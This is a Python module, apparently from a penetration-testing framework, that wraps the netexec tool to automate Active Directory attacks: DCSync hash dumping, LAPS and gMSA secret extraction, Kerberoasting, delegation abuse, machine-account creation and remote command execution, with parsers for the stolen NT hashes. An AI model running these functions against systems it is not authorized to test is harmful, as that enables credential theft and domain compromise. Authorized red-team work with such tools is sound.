"""Async subprocess wrapper for netexec (nxc), successor to CrackMapExec.

netexec supports multiple protocols (SMB, WinRM, LDAP, SSH, RDP, etc.)
for credential validation, enumeration, and command execution across
Active Directory environments.

Every public function returns a standardised result dict::

    {
        "success": bool,
        "output": str,          # raw stdout
        "parsed": dict | None,  # extracted structured data when available
        "error": str | None,    # stderr or exception message
    }
"""

from __future__ import annotations

import asyncio
import logging
import re
import shlex
from typing import Any

logger = logging.getLogger("pathstrike.tools.netexec")

_SENSITIVE_FLAGS = {"-p", "-H", "--password", "-hashes"}


def _redact_cmd(cmd: list[str]) -> str:
    """Redact sensitive arguments from a command list for logging."""
    redacted = []
    skip_next = False
    for i, arg in enumerate(cmd):
        if skip_next:
            redacted.append("***REDACTED***")
            skip_next = False
        elif arg in _SENSITIVE_FLAGS and i + 1 < len(cmd):
            redacted.append(arg)
            skip_next = True
        else:
            redacted.append(arg)
    return " ".join(shlex.quote(c) for c in redacted)


# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------


async def run_netexec(
    protocol: str,
    target: str,
    args: list[str],
    auth_args: list[str] | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Run a netexec command and return captured output.

    Builds the full command line::

        netexec <protocol> <target> [auth_args] [args]

    Supported protocols: ``smb``, ``winrm``, ``ldap``, ``ssh``, ``rdp``,
    ``mssql``, ``ftp``, ``wmi``.

    Args:
        protocol: Network protocol to use.
        target: Target host IP, FQDN, or CIDR range.
        args: Protocol/module specific arguments.
        auth_args: Authentication arguments (``-u``, ``-p``, ``-H``, ``-k``, etc.).
        timeout: Maximum seconds to wait for the subprocess.

    Returns:
        Standardised result dict.
    """
    cmd = ["netexec", protocol, target]
    if auth_args:
        cmd.extend(auth_args)
    cmd.extend(args)

    logger.debug("Executing: %s", _redact_cmd(cmd))

    from pathstrike.engine.command_emitter import placeholder_result, record_command
    if record_command("netexec", cmd, redacted=_redact_cmd(cmd)):
        return placeholder_result("netexec", cmd, subcommand=protocol)

    result: dict[str, Any] = {
        "success": False,
        "output": "",
        "parsed": None,
        "error": None,
        "tool": "netexec",
        "command": " ".join(shlex.quote(c) for c in cmd),
    }

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )

        stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
        stderr = stderr_bytes.decode("utf-8", errors="replace").strip()

        result["output"] = stdout
        result["stderr"] = stderr
        result["return_code"] = proc.returncode

        # netexec can return rc=0 even on auth failure; check output markers
        if proc.returncode != 0:
            result["error"] = stderr or f"netexec {protocol} exited with code {proc.returncode}"
            logger.error(
                "netexec %s failed (rc=%d): %s",
                protocol,
                proc.returncode,
                result["error"],
            )
            return result

        # Mark success based on output content
        # netexec shows [+] for positive results, [-] for failures
        has_positive = "[+]" in stdout
        has_negative = "[-]" in stdout and "[+]" not in stdout

        if has_negative and not has_positive:
            result["error"] = _extract_error_message(stdout)
            logger.warning("netexec %s reported failure: %s", protocol, result["error"])
        else:
            result["success"] = True
            result["parsed"] = _parse_netexec_output(protocol, stdout)
            logger.debug("netexec %s succeeded: %s", protocol, stdout[:200])

    except asyncio.TimeoutError:
        result["error"] = f"netexec {protocol} timed out after {timeout}s"
        result["error_type"] = "timeout"
        logger.error(result["error"])
    except FileNotFoundError:
        result["error"] = (
            "netexec binary not found. Install via: pip install netexec"
        )
        result["error_type"] = "tool_not_found"
        logger.error(result["error"])
    except OSError as exc:
        result["error"] = f"OS error launching netexec: {exc}"
        result["error_type"] = "os_error"
        logger.error(result["error"])

    return result


# ---------------------------------------------------------------------------
# Output parsing helpers
# ---------------------------------------------------------------------------


def _extract_error_message(stdout: str) -> str:
    """Extract the first error line from netexec output."""
    for line in stdout.splitlines():
        if "[-]" in line:
            return line.strip()
    return "Unknown netexec error"


def _parse_netexec_output(protocol: str, stdout: str) -> dict[str, Any] | None:
    """Extract structured data from netexec stdout."""
    parsed: dict[str, Any] = {}

    # Check for Pwn3d! (local admin)
    if "(Pwn3d!)" in stdout:
        parsed["admin"] = True

    # Extract hostname and domain from SMB banner.
    # NetExec format: "SMB  <ip>  <port>  <hostname>  [*] ..."
    # The protocol name is in the first column, then IP, port, and hostname.
    host_match = re.search(
        r"(?:SMB|LDAP|WINRM|RDP)\s+(?P<ip>\S+)\s+\d+\s+(?P<name>\S+)",
        stdout,
    )
    if host_match:
        parsed["target_ip"] = host_match.group("ip")
        parsed["target_name"] = host_match.group("name")

    # Extract LAPS passwords
    laps_matches = re.findall(
        r"(?P<computer>\S+)\s+(?:LAPS|ms-Mcs-AdmPwd)\s+(?P<password>\S+)",
        stdout,
        re.IGNORECASE,
    )
    if laps_matches:
        parsed["laps_passwords"] = {m[0]: m[1] for m in laps_matches}

    # Extract command output (lines after the banner)
    cmd_output_lines = []
    capture = False
    for line in stdout.splitlines():
        if capture:
            # Strip netexec prefix formatting
            cleaned = re.sub(r"^\S+\s+\d+\s+\S+\s+", "", line).strip()
            if cleaned:
                cmd_output_lines.append(cleaned)
        elif "[+]" in line:
            capture = True

    if cmd_output_lines:
        parsed["command_output"] = "\n".join(cmd_output_lines)

    return parsed if parsed else None


# ---------------------------------------------------------------------------
# Authentication argument builder
# ---------------------------------------------------------------------------


def build_nxc_auth(
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
    domain: str | None = None,
    ccache_path: str | None = None,
) -> list[str]:
    """Build netexec-style authentication arguments.

    Args:
        username: sAMAccountName.
        password: Plaintext password.
        nt_hash: NT hash for pass-the-hash.
        domain: AD domain name.
        ccache_path: Path to Kerberos ccache for ``-k`` authentication.

    Returns:
        List of CLI arguments suitable for passing to :func:`run_netexec`.
    """
    args: list[str] = ["-u", username]

    if domain:
        args.extend(["-d", domain])

    if ccache_path:
        args.extend(["--use-kcache", "-k"])
    elif nt_hash:
        args.extend(["-H", nt_hash])
    elif password:
        args.extend(["-p", password])
    else:
        # No credential -- pass empty password for unauthenticated checks
        args.extend(["-p", ""])

    return args


# ---------------------------------------------------------------------------
# Convenience functions
# ---------------------------------------------------------------------------


async def check_admin(
    target: str,
    auth_args: list[str],
    timeout: int = 15,
) -> bool:
    """Check if credentials grant local administrator access on the target.

    Uses SMB protocol to verify admin status. netexec marks admin access
    with ``(Pwn3d!)`` in its output.

    Args:
        target: Target host IP or FQDN.
        auth_args: Pre-built authentication arguments.

    Returns:
        ``True`` if the credentials have local admin on the target.
    """
    result = await run_netexec("smb", target, [], auth_args, timeout=timeout)
    return "(Pwn3d!)" in result.get("output", "")


async def dump_laps(
    target: str,
    auth_args: list[str],
    timeout: int = 30,
) -> dict[str, Any]:
    """Dump LAPS passwords from the target domain controller.

    Uses the ``laps`` module (``-M laps``) via the LDAP protocol to query
    ``ms-Mcs-AdmPwd`` / ``ms-LAPS-Password`` attributes on computer objects.

    .. note::
        NetExec's ``--laps`` flag on the SMB protocol is an **authentication**
        mechanism (auto-retrieves and uses the LAPS password to authenticate),
        not an enumeration feature.  For explicit LAPS password dumping,
        the ``-M laps`` module is the correct approach.

    Args:
        target: Domain controller IP or FQDN.
        auth_args: Pre-built authentication arguments.

    Returns:
        Result dict. On success, ``parsed["laps_passwords"]`` contains a
        mapping of computer names to LAPS passwords.
    """
    return await run_netexec("ldap", target, ["-M", "laps"], auth_args, timeout=timeout)


async def check_winrm(
    target: str,
    auth_args: list[str],
    timeout: int = 15,
) -> bool:
    """Check if credentials grant WinRM (PS Remoting) access on the target.

    Args:
        target: Target host IP or FQDN.
        auth_args: Pre-built authentication arguments.

    Returns:
        ``True`` if WinRM access is confirmed.
    """
    result = await run_netexec("winrm", target, [], auth_args, timeout=timeout)
    return result.get("success", False)


async def check_rdp(
    target: str,
    auth_args: list[str],
    timeout: int = 15,
) -> bool:
    """Check if credentials grant RDP access on the target.

    Args:
        target: Target host IP or FQDN.
        auth_args: Pre-built authentication arguments.

    Returns:
        ``True`` if RDP access is confirmed.
    """
    result = await run_netexec("rdp", target, [], auth_args, timeout=timeout)
    return result.get("success", False)


async def execute_command(
    protocol: str,
    target: str,
    command: str,
    auth_args: list[str],
    timeout: int = 30,
) -> dict[str, Any]:
    """Execute a command on the target via the specified protocol.

    Supports ``smb`` (via ``-x`` for cmd or ``-X`` for PowerShell) and
    ``winrm`` (via ``-x`` or ``-X``).

    Args:
        protocol: Protocol to use for execution (``smb`` or ``winrm``).
        target: Target host IP or FQDN.
        command: Command string to execute remotely.
        auth_args: Pre-built authentication arguments.

    Returns:
        Result dict. On success, ``parsed["command_output"]`` may contain
        the command's output.
    """
    return await run_netexec(
        protocol, target, ["-x", command], auth_args, timeout=timeout
    )


async def execute_powershell(
    protocol: str,
    target: str,
    command: str,
    auth_args: list[str],
    timeout: int = 30,
) -> dict[str, Any]:
    """Execute a PowerShell command on the target via the specified protocol.

    Args:
        protocol: Protocol to use for execution (``smb`` or ``winrm``).
        target: Target host IP or FQDN.
        command: PowerShell command string to execute remotely.
        auth_args: Pre-built authentication arguments.

    Returns:
        Result dict with command output.
    """
    return await run_netexec(
        protocol, target, ["-X", command], auth_args, timeout=timeout
    )


# ---------------------------------------------------------------------------
# Delegation / S4U  (netexec's native constrained-delegation abuse)
# ---------------------------------------------------------------------------


async def s4u_delegate(
    target: str,
    auth_args: list[str],
    impersonate: str,
    spn: str | None = None,
    self_only: bool = False,
    generate_st: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Abuse (resource-based) constrained delegation via netexec's S4U flow.

    Authenticates *as the delegation-enabled account* (carried in
    ``auth_args``) against ``target`` and performs S4U2Self + S4U2Proxy to
    obtain a service ticket impersonating *impersonate*.  This is netexec's
    native equivalent of Impacket ``getST`` and is used as a fallback for the
    delegation handlers when the Impacket path is unavailable or fails.

    Args:
        target: Host whose SPN the ticket is requested for (the delegation target).
        auth_args: Auth args for the delegating principal (``-u``/``-p``/``-H``/``-k``).
        impersonate: User to impersonate (e.g. ``Administrator``).
        spn: Service SPN for S4U2Proxy. Defaults to ``cifs/<target>`` (netexec default).
        self_only: Only do S4U2Self (no S4U2Proxy) — for unconstrained-style checks.
        generate_st: If given, netexec stores the resulting service ticket here.

    Returns:
        Standardised result dict (``parsed`` may contain the ticket path).
    """
    args = ["--delegate", impersonate]
    if spn:
        args.extend(["--delegate-spn", spn])
    if self_only:
        args.append("--self")
    if generate_st:
        args.extend(["--generate-st", generate_st])
    return await run_netexec("smb", target, args, auth_args, timeout=timeout)


async def generate_tgt(
    target: str,
    auth_args: list[str],
    out_path: str,
    timeout: int = 30,
) -> dict[str, Any]:
    """Mint a TGT for the authenticating account and store it at *out_path*."""
    return await run_netexec(
        "smb", target, ["--generate-tgt", out_path], auth_args, timeout=timeout
    )


# ---------------------------------------------------------------------------
# Secret extraction  (DCSync / gMSA — fallbacks for impacket / bloodyAD)
# ---------------------------------------------------------------------------


async def ntds_dump(
    target: str,
    auth_args: list[str],
    method: str = "drsuapi",
    user: str | None = None,
    timeout: int = 300,
) -> dict[str, Any]:
    """DCSync the NTDS database via ``smb --ntds`` (fallback for secretsdump).

    Args:
        target: Domain controller IP/FQDN.
        auth_args: Auth args for an account with replication (DCSync) rights.
        method: ``drsuapi`` (DCSync, default) or ``vss``.
        user: Optional single ``DOMAIN/user`` to extract (``--user``).

    Returns:
        Result dict. On success, ``parsed["hashes"]`` maps ``user`` → NT hash.
    """
    args = ["--ntds", method]
    if user:
        args.extend(["--user", user])
    result = await run_netexec("smb", target, args, auth_args, timeout=timeout)
    hashes = _parse_secretsdump_hashes(result.get("output", ""))
    if hashes:
        result.setdefault("parsed", {})
        result["parsed"] = {**(result["parsed"] or {}), "hashes": hashes}
        result["hashes"] = hashes
        result["success"] = True
    return result


async def dump_gmsa(
    target: str,
    auth_args: list[str],
    timeout: int = 30,
) -> dict[str, Any]:
    """Enumerate gMSA managed-password NT hashes via ``ldap --gmsa``.

    Fallback for bloodyAD's ``read_gmsa``.

    Returns:
        Result dict. On success, ``parsed["gmsa"]`` maps account → NT hash.
    """
    result = await run_netexec("ldap", target, ["--gmsa"], auth_args, timeout=timeout)
    gmsa = _parse_gmsa_hashes(result.get("output", ""))
    if gmsa:
        result.setdefault("parsed", {})
        result["parsed"] = {**(result["parsed"] or {}), "gmsa": gmsa}
        result["gmsa"] = gmsa
        result["success"] = True
    return result


# ---------------------------------------------------------------------------
# Roasting  (Kerberoast / AS-REP — fallbacks for impacket GetUserSPNs/GetNPUsers)
# ---------------------------------------------------------------------------


async def kerberoast(
    target: str,
    auth_args: list[str],
    out_path: str,
    accounts: list[str] | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Kerberoast via ``ldap --kerberoasting`` (optionally targeted accounts).

    Args:
        target: Domain controller IP/FQDN.
        auth_args: Auth args for any authenticated account.
        out_path: File netexec writes the ``$krb5tgs$`` hashes to.
        accounts: Optional sAMAccountNames for targeted roasting
            (``--kerberoast-account``); when omitted, roasts all SPN accounts.
    """
    args = ["--kerberoasting", out_path]
    if accounts:
        args.append("--kerberoast-account")
        args.extend(accounts)
    return await run_netexec("ldap", target, args, auth_args, timeout=timeout)


async def asreproast(
    target: str,
    auth_args: list[str],
    out_path: str,
    timeout: int = 60,
) -> dict[str, Any]:
    """AS-REP roast via ``ldap --asreproast`` (writes hashes to *out_path*)."""
    return await run_netexec(
        "ldap", target, ["--asreproast", out_path], auth_args, timeout=timeout
    )


# ---------------------------------------------------------------------------
# Computer staging  (RBCD — fallback for bloodyAD add/del computer)
# ---------------------------------------------------------------------------


async def add_computer(
    target: str,
    auth_args: list[str],
    name: str,
    password: str,
    timeout: int = 30,
) -> dict[str, Any]:
    """Add a domain computer via the ``add-computer`` module (fallback path).

    Args:
        target: Domain controller IP/FQDN.
        auth_args: Auth args for an account with ms-DS-MachineAccountQuota.
        name: Computer name (without the trailing ``$``).
        password: Password for the new machine account.
    """
    args = ["-M", "add-computer", "-o", f"NAME={name}", f"PASSWORD={password}"]
    return await run_netexec("smb", target, args, auth_args, timeout=timeout)


async def del_computer(
    target: str,
    auth_args: list[str],
    name: str,
    timeout: int = 30,
) -> dict[str, Any]:
    """Delete a domain computer via the ``add-computer`` module (``DELETE=True``)."""
    args = ["-M", "add-computer", "-o", f"NAME={name}", "DELETE=True"]
    return await run_netexec("smb", target, args, auth_args, timeout=timeout)


# ---------------------------------------------------------------------------
# Command execution over mssql / wmi  (fallbacks for impacket mssqlclient/dcomexec)
# ---------------------------------------------------------------------------


async def mssql_exec(
    target: str,
    auth_args: list[str],
    command: str,
    powershell: bool = False,
    windows_auth: bool = True,
    timeout: int = 45,
) -> dict[str, Any]:
    """Execute an OS command on a MSSQL host via ``mssql -x`` (xp_cmdshell).

    netexec enables/uses ``xp_cmdshell`` internally, so this is a single-call
    fallback for the Impacket ``mssqlclient`` SQLAdmin flow.

    Args:
        windows_auth: Use Windows (domain) auth; netexec defaults to this when a
            domain is present in ``auth_args``.
    """
    flag = "-X" if powershell else "-x"
    return await run_netexec("mssql", target, [flag, command], auth_args, timeout=timeout)


async def mssql_query(
    target: str,
    auth_args: list[str],
    query: str,
    timeout: int = 45,
) -> dict[str, Any]:
    """Run a raw T-SQL query via ``mssql -q`` (e.g. to enable xp_cmdshell)."""
    return await run_netexec("mssql", target, ["-q", query], auth_args, timeout=timeout)


async def wmi_exec(
    target: str,
    auth_args: list[str],
    command: str,
    powershell: bool = False,
    timeout: int = 45,
) -> dict[str, Any]:
    """Execute a command on the target via the ``wmi`` protocol (DCOM fallback)."""
    flag = "-X" if powershell else "-x"
    return await run_netexec("wmi", target, [flag, command], auth_args, timeout=timeout)


async def loggedon_users(
    target: str,
    auth_args: list[str],
    timeout: int = 30,
) -> dict[str, Any]:
    """List interactive sessions on the target via ``smb --loggedon-users``.

    The live primitive behind ``HasSession`` — confirms which users actually
    have a session on the host (requires local admin on the target).
    """
    return await run_netexec(
        "smb", target, ["--loggedon-users"], auth_args, timeout=timeout
    )


# ---------------------------------------------------------------------------
# Secret-output parsers
# ---------------------------------------------------------------------------


def _parse_secretsdump_hashes(stdout: str) -> dict[str, str]:
    """Extract ``user -> NT hash`` from ``DOMAIN\\user:rid:lm:nt:::`` lines."""
    hashes: dict[str, str] = {}
    # netexec prefixes ntds lines with its column banner; the secret itself is
    # the classic pwdump format: name:rid:lmhash:nthash:::
    for m in re.finditer(
        r"(?P<name>[^\s:]+):\d+:(?P<lm>[0-9a-fA-F]{32}):(?P<nt>[0-9a-fA-F]{32}):::",
        stdout,
    ):
        name = m.group("name").split("\\")[-1]
        hashes[name] = m.group("nt")
    return hashes


def _parse_gmsa_hashes(stdout: str) -> dict[str, str]:
    """Extract ``account -> NT hash`` from netexec gMSA output.

    Lines look like: ``Account: gmsaDragon$    NTLM: <32-hex>``.
    """
    gmsa: dict[str, str] = {}
    for m in re.finditer(
        r"Account:\s*(?P<acct>\S+)\s+NTLM:\s*(?P<nt>[0-9a-fA-F]{32})",
        stdout,
    ):
        gmsa[m.group("acct")] = m.group("nt")
    return gmsa


async def spider_shares(
    target: str,
    auth_args: list[str],
    pattern: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Spider SMB shares on the target, optionally filtering by file pattern.

    Args:
        target: Target host IP or FQDN.
        auth_args: Pre-built authentication arguments.
        pattern: Optional regex pattern to filter discovered files.

    Returns:
        Result dict with share enumeration output.
    """
    args = ["--spider"]
    if pattern:
        args.extend(["--pattern", pattern])

    return await run_netexec("smb", target, args, auth_args, timeout=timeout)


async def spider_plus(
    target: str,
    auth_args: list[str],
    timeout: int = 120,
) -> dict[str, Any]:
    """Spider SMB shares using the spider_plus module for comprehensive enumeration.

    The spider_plus module provides more detailed share enumeration than
    the built-in ``--spider`` flag, including file sizes, permissions,
    and content previews.

    Args:
        target: Target host IP or FQDN.
        auth_args: Pre-built authentication arguments.
        timeout: Maximum seconds (default higher due to enumeration volume).

    Returns:
        Result dict with share enumeration output.
    """
    return await run_netexec(
        "smb", target, ["-M", "spider_plus"], auth_args, timeout=timeout
    )
